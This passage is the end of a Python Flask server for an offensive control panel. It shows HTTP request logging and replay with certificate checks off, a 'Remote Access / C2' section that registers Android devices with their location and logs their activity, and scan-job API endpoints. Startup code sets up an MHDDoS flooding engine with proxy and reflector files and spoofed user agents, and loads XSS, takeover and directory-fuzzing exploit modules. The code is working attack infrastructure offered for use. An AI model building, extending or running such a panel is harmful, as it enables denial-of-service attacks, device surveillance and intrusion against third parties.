        method=request.args.get("method"),
        status_min=status_min,
        status_max=status_max,
        anomaly=request.args.get("anomaly"),
        tag=request.args.get("tag"),
        ip=request.args.get("ip"),
        since_ms=since_ms,
    ))


@app.route("/api/logger/requests/<entry_id>")
@login_required
def api_logger_detail(entry_id):
    guard = _require_http_logger()
    if guard:
        return guard
    entry = http_logger.get(entry_id)
    if entry is None:
        return jsonify({"error": "not_found"}), 404
    return jsonify(entry)


@app.route("/api/logger/requests", methods=["DELETE"])
@login_required
def api_logger_clear():
    guard = _require_http_logger()
    if guard:
        return guard
    n = http_logger.clear()
    return jsonify({"success": True, "cleared": n})


@app.route("/api/logger/requests/<entry_id>/tag", methods=["POST"])
@login_required
def api_logger_tag(entry_id):
    guard = _require_http_logger()
    if guard:
        return guard
    body = _json_body()
    tag = (body.get("tag") or "").strip()
    add = bool(body.get("add", True))
    if not tag:
        return jsonify({"error": "tag required"}), 400
    ok = http_logger.tag(entry_id, tag, add=add)
    if not ok:
        return jsonify({"error": "not_found"}), 404
    return jsonify({"success": True})


@app.route("/api/logger/stats")
@login_required
def api_logger_stats():
    guard = _require_http_logger()
    if guard:
        return guard
    return jsonify(http_logger.stats())


@app.route("/api/logger/export")
@login_required
def api_logger_export():
    guard = _require_http_logger()
    if guard:
        return guard
    fmt = (request.args.get("format") or "har").lower()
    since_ms = request.args.get("since_ms", type=int)
    method = request.args.get("method")
    q = request.args.get("q")

    result = http_logger.list(page=1, size=500, q=q, method=method,
                               since_ms=since_ms)
    items = result.get("items") or []

    if fmt == "har":
        payload = json.dumps(http_logger.to_har(items),
                              ensure_ascii=False, indent=2)
        filename = f"http-logger-{int(time.time())}.har"
        mimetype = "application/json"
    elif fmt == "json":
        payload = json.dumps({"entries": items}, ensure_ascii=False, indent=2)
        filename = f"http-logger-{int(time.time())}.json"
        mimetype = "application/json"
    elif fmt == "jsonl":
        payload = "\n".join(json.dumps(e, ensure_ascii=False) for e in items)
        filename = f"http-logger-{int(time.time())}.jsonl"
        mimetype = "application/x-ndjson"
    else:
        return jsonify({"error": f"unsupported format: {fmt}"}), 400

    return Response(
        payload, mimetype=mimetype,
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


@app.route("/api/logger/stream")
@login_required
def api_logger_stream():
    guard = _require_http_logger()
    if guard:
        return guard
    subscriber = http_logger.subscribe()

    def _gen():
        try:
            yield ": connected\n\n"
            last_hb = time.time()
            while True:
                try:
                    event = subscriber.get(timeout=10)
                    yield f"data: {json.dumps(event, ensure_ascii=False)}\n\n"
                    last_hb = time.time()
                except QueueEmpty:
                    if time.time() - last_hb > 10:
                        yield ": ping\n\n"
                        last_hb = time.time()
        except GeneratorExit:
            pass
        finally:
            http_logger.unsubscribe(subscriber)

    return Response(
        stream_with_context(_gen()),
        mimetype="text/event-stream",
        headers={
            "Cache-Control": "no-cache, no-transform",
            "X-Accel-Buffering": "no",
            "Connection": "keep-alive",
        },
    )


@app.route("/api/logger/replay/<entry_id>", methods=["POST"])
@login_required
def api_logger_replay(entry_id):
    guard = _require_http_logger()
    if guard:
        return guard
    entry = http_logger.get(entry_id)
    if not entry:
        return jsonify({"error": "not_found"}), 404

    body = _json_body()
    override_host = (body.get("override_host") or "").strip()
    headers = entry.get("headers") or {}
    host = override_host or headers.get("Host", "")
    if not host:
        return jsonify({"error": "no target host"}), 400

    scheme = entry.get("scheme") or "http"
    path = entry.get("path") or "/"
    query = entry.get("query") or ""
    url = f"{scheme}://{host}{path}" + (f"?{query}" if query else "")

    safe_headers = {}
    for k, v in headers.items():
        if k.lower() in ("host", "content-length", "connection",
                         "transfer-encoding"):
            continue
        safe_headers[k] = v
    safe_headers["User-Agent"] = "Emergens-Replay/1.0"

    method = entry.get("method", "GET")
    body_data = entry.get("body_preview") if method not in ("GET", "HEAD") else None

    try:
        r = requests.request(
            method, url, headers=safe_headers, data=body_data,
            timeout=15, allow_redirects=False, verify=False,
        )
        return jsonify({
            "success": True,
            "url": url,
            "method": method,
            "status": r.status_code,
            "elapsed_ms": round(r.elapsed.total_seconds() * 1000, 1),
            "response_headers": dict(r.headers),
            "body_preview": r.text[:2000],
        })
    except requests.exceptions.RequestException as e:
        return jsonify({"success": False, "error": str(e), "url": url}), 502


# ═══════════════════════════════════════════════════════════════════════════
# Remote Access / C2
# ═══════════════════════════════════════════════════════════════════════════
_lock_state: Dict[str, Any] = {"locked": True, "locked_by": None, "locked_at": None}
_c2_devices: List[Dict[str, Any]] = []
_c2_activities: List[Dict[str, Any]] = []
_c2_lock = threading.Lock()


@app.route("/api/c2/status")
@login_required
def c2_status():
    return jsonify({
        "authenticated": True,
        "username": session.get("username"),
        "role": session.get("role"),
        "lock_state": _lock_state,
    })


@app.route("/api/c2/toggle_lock", methods=["POST"])
@login_required
def c2_toggle_lock():
    with _c2_lock:
        _lock_state["locked"] = not _lock_state["locked"]
        if _lock_state["locked"]:
            _lock_state["locked_by"] = session.get("username")
            _lock_state["locked_at"] = _now_iso()
        else:
            _lock_state["locked_by"] = None
            _lock_state["locked_at"] = None
        return jsonify({"success": True, "lock_state": _lock_state})


@app.route("/api/c2/devices")
@login_required
def c2_devices():
    return jsonify({"devices": _c2_devices})


@app.route("/api/c2/activities")
@login_required
def c2_activities():
    limit = min(request.args.get("limit", 50, type=int), 200)
    return jsonify({"activities": _c2_activities[-limit:]})


@app.route("/api/c2/register_device", methods=["POST"])
@login_required
def c2_register_device():
    data = _json_body()
    device_id = (data.get("id") or "").strip()
    if not device_id:
        return jsonify({"error": "Device ID is required"}), 400
    device = {
        "id": device_id,
        "name": data.get("name", device_id),
        "model": data.get("model", ""),
        "serial": data.get("serial", ""),
        "android": data.get("android", ""),
        "status": "online",
        "battery": data.get("battery"),
        "location": data.get("location", ""),
        "temperature": data.get("temperature", ""),
        "last_seen": _now_iso(),
    }
    with _c2_lock:
        for i, d in enumerate(_c2_devices):
            if d["id"] == device_id:
                _c2_devices[i] = device
                break
        else:
            _c2_devices.append(device)
    return jsonify({"success": True, "device": device})


@app.route("/api/c2/log_activity", methods=["POST"])
@login_required
def c2_log_activity():
    data = _json_body()
    device_id = (data.get("device_id") or "").strip()
    action = (data.get("action") or "").strip()
    if not device_id or not action:
        return jsonify({"error": "device_id and action are required"}), 400
    device_name = next(
        (d["name"] for d in _c2_devices if d["id"] == device_id), device_id
    )
    with _c2_lock:
        _c2_activities.append({
            "device_id": device_id,
            "device_name": device_name,
            "action": action,
            "timestamp": data.get("timestamp") or _now_iso(),
        })
    return jsonify({"success": True})


# ═══════════════════════════════════════════════════════════════════════════
# 404 handler
# ═══════════════════════════════════════════════════════════════════════════
@app.errorhandler(404)
def page_not_found(e):
    if request.path.startswith("/api/"):
        return jsonify({"error": "not_found", "path": request.path}), 404
    username = session.get("username") if session.get("authenticated") else "Guest"
    html = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>404 — Lost Area</title>
<style>
body{margin:0;background:#000;color:#fff;font-family:system-ui,sans-serif;
     display:flex;flex-direction:column;justify-content:center;align-items:center;
     height:100vh;text-align:center}
h1{font-size:clamp(1.2rem,3.5vw,2.5rem);font-weight:300;letter-spacing:.35em;
   text-transform:uppercase;margin:0 0 20px}
.user{font-size:.9rem;letter-spacing:.2em;color:#aaa;text-transform:uppercase;
      margin-bottom:10px}
.url{position:absolute;bottom:20px;font-size:.7rem;color:#888;
     word-break:break-all;padding:0 20px}
</style></head>
<body>
<div class="user">__USERNAME__</div>
<h1>Lost Area</h1>
<div class="url" id="u"></div>
<script>document.getElementById('u').textContent=location.href;</script>
</body></html>"""
    return html.replace("__USERNAME__", username), 404


# ═══════════════════════════════════════════════════════════════════════════
# Additional endpoints
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/settings/server-name", methods=["GET", "POST"])
@login_required
def server_name():
    if request.method == "GET":
        settings = _load_json("settings", {})
        return jsonify({"name": settings.get("server_name", "")})

    u = current_user()
    if u and u.get("role") != "owner":
        return jsonify({"error": "Owner access required"}), 403

    body = _json_body()
    with _json_lock("settings"):
        settings = _load_json("settings", {})
        settings["server_name"] = (body.get("name") or "").strip()
        _save_json("settings", settings)
    logger.info("Server name set to '%s' by '%s'",
                 settings["server_name"], session.get("username"))
    return jsonify({"name": settings["server_name"]})


@app.route("/api/settings/servers")
@owner_required
def panel_manager():
    return jsonify(_load_json("servers", []))


ALLOWED_IMAGE_TYPES = {"image/png", "image/jpeg", "image/gif", "image/webp"}


@app.route("/api/profile/photo", methods=["POST"])
@login_required
def profile_photo():
    u = current_user()
    if not u:
        return jsonify({"error": "Not authenticated"}), 401
    body = _json_body()

    with _json_lock("profiles"):
        profiles = _load_json("profiles", {})
        profile = profiles.setdefault(u["username"], {})

        if body.get("remove"):
            profile["avatar_url"] = None
            _save_json("profiles", profiles)
            return jsonify({"ok": True, "avatar_url": None})

        if body.get("url"):
            url = (body["url"] or "").strip()
            if not (url.startswith("http://") or url.startswith("https://")):
                return jsonify({"error": "Please provide a valid http(s) image URL."}), 400
            profile["avatar_url"] = url
            _save_json("profiles", profiles)
            return jsonify({"ok": True, "avatar_url": url})

        if body.get("image_base64"):
            data_url = body["image_base64"]
            try:
                header, encoded = data_url.split(",", 1)
                mime = header.split(";")[0].replace("data:", "")
                if mime not in ALLOWED_IMAGE_TYPES:
                    return jsonify({"error": "Unsupported image type."}), 400
                raw = base64.b64decode(encoded)
                if len(raw) > 5 * 1024 * 1024:
                    return jsonify({"error": "Image is too large (max 5MB)."}), 400
                ext = mime.split("/")[1]
                filename = f"{u['username']}_{uuid.uuid4().hex[:8]}.{ext}"
                with open(os.path.join(UPLOAD_DIR, filename), "wb") as f:
                    f.write(raw)
                profile["avatar_url"] = f"/api/profile/photo/{filename}"
                _save_json("profiles", profiles)
                return jsonify({"ok": True, "avatar_url": profile["avatar_url"]})
            except (ValueError, binascii.Error):
                return jsonify({"error": "Could not decode that image."}), 400
    return jsonify({"error": "Provide image_base64, url, or remove:true."}), 400


@app.route("/api/profile/photo/<path:filename>")
def serve_profile_photo(filename):
    return send_from_directory(UPLOAD_DIR, filename)


# ═══════════════════════════════════════════════════════════════════════════
# Global Chat
# ═══════════════════════════════════════════════════════════════════════════
CHAT_HISTORY_LIMIT = 300
_chat_cache: Dict[str, Any] = {"data": None, "mtime": 0.0}
_chat_cache_lock = threading.Lock()


def _get_chat_cached():
    path = os.path.join(DATA_DIR, "chat.json")
    try:
        mtime = os.path.getmtime(path)
    except OSError:
        return {"messages": [], "locked": False}
    with _chat_cache_lock:
        if _chat_cache["data"] is not None and _chat_cache["mtime"] == mtime:
            return _chat_cache["data"]
    data = _load_json("chat", {"messages": [], "locked": False})
    with _chat_cache_lock:
        _chat_cache["data"] = data
        _chat_cache["mtime"] = mtime
    return data


@app.route("/api/chat/messages")
@login_required
def chat_messages():
    chat = _get_chat_cached()
    profiles = _load_json("profiles", {})
    users_by_name = {u["username"]: u for u in _load_json("users", [])}
    enriched = []
    for m in chat.get("messages", []):
        u = users_by_name.get(m.get("username"))
        enriched.append({
            **m,
            "role": u.get("role") if u else m.get("role", "--"),
            "avatar_url": profiles.get(m.get("username"), {}).get("avatar_url"),
        })
    return jsonify({"messages": enriched, "locked": chat.get("locked", False)})


@app.route("/api/chat/send", methods=["POST"])
@login_required
def chat_send():
    u = current_user()
    if not u:
        return jsonify({"error": "Not authenticated"}), 401
    body = _json_body()
    text = (body.get("text") or "").strip()
    if not text:
        return jsonify({"error": "Message text is required."}), 400
    text = text[:500]

    with _json_lock("chat"):
        chat = _load_json("chat", {"messages": [], "locked": False})
        if chat.get("locked") and u.get("role") != "owner":
            return jsonify({"error": "Chat is locked by the Owner."}), 423
        message = {
            "id": uuid.uuid4().hex,
            "username": u["username"],
            "role": u["role"],
            "text": text,
            "timestamp": _now_iso(),
        }
        chat["messages"].append(message)
        chat["messages"] = chat["messages"][-CHAT_HISTORY_LIMIT:]
        _save_json("chat", chat)
    return jsonify({"ok": True, "id": message["id"]})


@app.route("/api/chat/lock", methods=["POST"])
@owner_required
def chat_lock():
    body = _json_body()
    with _json_lock("chat"):
        chat = _load_json("chat", {"messages": [], "locked": False})
        chat["locked"] = bool(body.get("locked"))
        chat["messages"].append({
            "id": uuid.uuid4().hex,
            "is_system": True,
            "text": f'{session.get("username")} '
                    f'{"locked" if chat["locked"] else "unlocked"} Global Chat.',
            "timestamp": _now_iso(),
        })
        _save_json("chat", chat)
    return jsonify({"ok": True, "locked": chat["locked"]})


# ═══════════════════════════════════════════════════════════════════════════
# External API v1
# ═══════════════════════════════════════════════════════════════════════════
@app.route("/api/v1/ping", methods=["POST"])
@_api_key_required
def v1_ping():
    return jsonify({"ok": True, "server_time": _now_iso(),
                    "owner": g.api_key_owner})


@app.route("/api/v1/scan", methods=["POST"])
@_api_key_required
def v1_scan_start():
    body = _json_body()
    target = (body.get("target") or "").strip()
    mode = body.get("mode") or "basic"
    tools = body.get("tools") or []
    if not target:
        return jsonify({"error": "A target is required."}), 400
    return jsonify({"job_id": scan_orchestrator.start_scan(
        target, mode, tools, history_store)})


@app.route("/api/v1/scan/<job_id>")
@_api_key_required
def v1_scan_status(job_id):
    progress = scan_orchestrator.get_progress(job_id)
    if progress is None:
        return jsonify({"error": "not_found"}), 404
    return jsonify(progress)


# ═══════════════════════════════════════════════════════════════════════════
# Startup helpers
# ═══════════════════════════════════════════════════════════════════════════
def _ensure_engine_layout() -> None:
    files_dir = Path(PROJECT_ROOT) / "files"
    proxies_dir = files_dir / "proxies"
    proxies_dir.mkdir(parents=True, exist_ok=True)
    MHDDOS_LOG_DIR.mkdir(parents=True, exist_ok=True)

    config_path = Path(PROJECT_ROOT) / "config.json"
    if not config_path.exists():
        config_path.write_text(
            json.dumps({"proxy-providers": [],
                        "MINECRAFT_DEFAULT_PROTOCOL": 758}, indent=2),
            encoding="utf-8",
        )

    for name in ALLOWED_PROXY_FILES:
        p = proxies_dir / name
        if not p.exists():
            p.write_text("", encoding="utf-8")

    for name in ALLOWED_REFLECTOR_FILES:
        p = files_dir / name
        if not p.exists():
            p.write_text("", encoding="utf-8")

    ua_path = files_dir / "useragent.txt"
    if not ua_path.exists() or not ua_path.read_text(
            encoding="utf-8", errors="ignore").strip():
        ua_path.write_text(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36\n",
            encoding="utf-8",
        )

    ref_path = files_dir / "referers.txt"
    if not ref_path.exists() or not ref_path.read_text(
            encoding="utf-8", errors="ignore").strip():
        ref_path.write_text(
            "https://www.google.com/\n"
            "https://www.bing.com/\n"
            "https://duckduckgo.com/\n",
            encoding="utf-8",
        )


def _check_route_collisions() -> None:
    """Warn if two rules produce the same (rule, method) pair."""
    seen: Dict[tuple, str] = {}
    for rule in app.url_map.iter_rules():
        for method in (rule.methods or set()) - {"HEAD", "OPTIONS"}:
            key = (rule.rule, method)
            if key in seen:
                logger.warning("Route collision: %s %s (from %s and %s)",
                                method, rule.rule, seen[key], rule.endpoint)
            seen[key] = rule.endpoint


def _print_startup(port: Optional[int] = None) -> None:
    print(BANNER, flush=True)
    print(BANNER_TAGLINE, flush=True)
    print(f"  {'─' * 68}", flush=True)

    info_lines = []
    if port is not None:
        info_lines.append(f"  Server     : http://localhost:{port}")
    info_lines.append(f"  Tools      : {len(scan_orchestrator.list_tools())} loaded")
    info_lines.append(f"  Account    : {DEFAULT_USERNAME}")
    info_lines.append(f"  MHDDoS     : "
                      f"{'ready' if MHDDOS_SCRIPT.exists() else 'start.py missing'}")
    info_lines.append(f"  Engine py  : {PYTHON_EXE}")
    info_lines.append(f"  HTTP log   : {'ready' if http_logger else 'unavailable'}")

    mod_status = []
    if _xss_available:      mod_status.append("XSS")
    if _sniper_available:   mod_status.append("Sniper")
    if _takeover_available: mod_status.append("Takeover")
    if _dirfuzz_available:  mod_status.append("Dirfuzz")
    info_lines.append(f"  Exploit    : {', '.join(mod_status) or 'none'}")

    # OSINT standalone banner
    if _osint_available and _osint_standalone_ok:
        info_lines.append("  OSINT      : ready (standalone · excluded from scan)")
    elif _osint_available and not _osint_standalone_ok:
        info_lines.append(f"  OSINT      : ⚠ {_osint_standalone_msg}")
    else:
        info_lines.append("  OSINT      : unavailable")

    print("\n".join(info_lines), flush=True)
    print(f"  {'─' * 68}", flush=True)
    print(f"  Started at : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
          flush=True)
    print(flush=True)


# ── Idempotent shutdown ────────────────────────────────────────────────
_shutdown_lock = threading.Lock()
_shutdown_done = False


def _graceful_shutdown(*_args) -> None:
    global _shutdown_done
    with _shutdown_lock:
        if _shutdown_done:
            return
        _shutdown_done = True

    logger.info("Shutdown signal received — cancelling jobs")
    try:
        job_manager.cancel_all()
    except Exception:
        pass
    try:
        scan_orchestrator.cancel_all()
    except Exception:
        pass
    try:
        _mhddos_stop_all()
    except Exception:
        pass
    time.sleep(0.5)


atexit.register(_graceful_shutdown)


def _signal_handler(signum, _frame):
    _graceful_shutdown()
    sys.exit(0)


for _sig_name in ("SIGINT", "SIGTERM"):
    if hasattr(signal, _sig_name):
        try:
            signal.signal(getattr(signal, _sig_name), _signal_handler)
        except (ValueError, OSError):
            pass


# ═══════════════════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    # ── reset-password subcommand ────────────────────────────────────
    if len(sys.argv) > 1 and sys.argv[1] == "reset-password":
        existing_role = get_role(DEFAULT_USERNAME) or "owner"
        new_password = create_user(DEFAULT_USERNAME, role=existing_role)
        print(BANNER, flush=True)
        print(f"  Password reset for '{DEFAULT_USERNAME}' "
              f"(role={existing_role})", flush=True)
        print(f"  Password: {new_password}", flush=True)
        print("  Copy it now — it will not be shown again.", flush=True)
        sys.exit(0)

    # ── First-run bootstrap ──────────────────────────────────────────
    new_password = ensure_default_user()
    if new_password:
        print(BANNER, flush=True)
        print("  First run — account created automatically", flush=True)
        print(f"  Username: {DEFAULT_USERNAME}", flush=True)
        print(f"  Password: {new_password}", flush=True)
        print("  Role:     owner", flush=True)
        print("  Save this password now — you will need it to log in.",
              flush=True)
        print(flush=True)

    auto_restart_bot()
    _ensure_engine_layout()
    _check_route_collisions()

    job_manager.start_sweeper()

    # ── Pre-warm wordlists (background) ──────────────────────────────
    def _warmup():
        if _xss_available and xss_module is not None:
            try:
                n = len(xss_module.load_wordlist())
                logger.info("XSS wordlist ready — %d payloads", n)
            except Exception as e:
                logger.warning("XSS wordlist warmup failed: %s", e)
        if _dirfuzz_available and dirfuzz_module is not None:
            try:
                n = len(dirfuzz_module.load_wordlist("lottery-dirs.txt",
                                                      max_lines=200))
                logger.info("Dirfuzz wordlist ready — %d entries", n)
            except Exception as e:
                logger.warning("Dirfuzz wordlist warmup failed: %s", e)

    threading.Thread(target=_warmup, daemon=True,
                     name="wordlist-warmup").start()

    # ── Port prompt ──────────────────────────────────────────────────
    default_port = int(Config.PORT) if hasattr(Config, "PORT") else 8080
    while True:
        try:
            port_input = input(
                f"Enter port (default {default_port}, press Enter for default): "
            ).strip()
            if port_input == "":
                port = default_port
                break
            port = int(port_input)
            if port < 1 or port > 65535:
                print("Port must be between 1 and 65535.")
                continue
            break
        except ValueError:
            print("Invalid input. Enter a valid port number.")

    _print_startup(port)

    app.run(
        host="0.0.0.0",
        port=port,
        debug=False,
        threaded=True,
        use_reloader=False,
    )
